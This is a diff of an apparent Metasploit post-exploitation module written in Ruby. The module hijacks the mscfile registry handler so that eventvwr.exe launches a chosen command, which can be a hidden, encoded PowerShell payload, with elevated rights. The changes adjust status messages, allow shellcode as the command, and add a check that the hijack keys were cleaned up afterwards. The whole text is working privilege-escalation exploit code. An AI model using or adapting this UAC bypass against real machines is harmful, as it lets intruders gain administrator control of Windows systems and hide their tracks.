@@ -158,7 +158,7 @@ def ls_stage1
   r=''
   session = client
   vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
-  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute
+  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # %comspec% path
   psh_comma = "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
@@ -263,13 +263,21 @@ def ls_stage2
 
  # Delete hijacking hive keys from target regedit...
  # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
- print_good(" Deleting hive registry keys...")
+ print_good(" Deleting HKCU hive registry keys...")
  r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(3.0)
 
+      # check if remote registry hive keys was deleted successefuly
+      if not registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
+        print_status("Registry hive keys deleted successefuly!")
+      else
+        print_error("Module can not verifie if deletion has successefully!")
+      end
+
+    Rex::sleep(1.0)
     # close channel when done
-    print_status("registry hijack reverted to default stage")
+    print_status("process hijack reverted to default stage")
     r.channel.close
     r.close
 
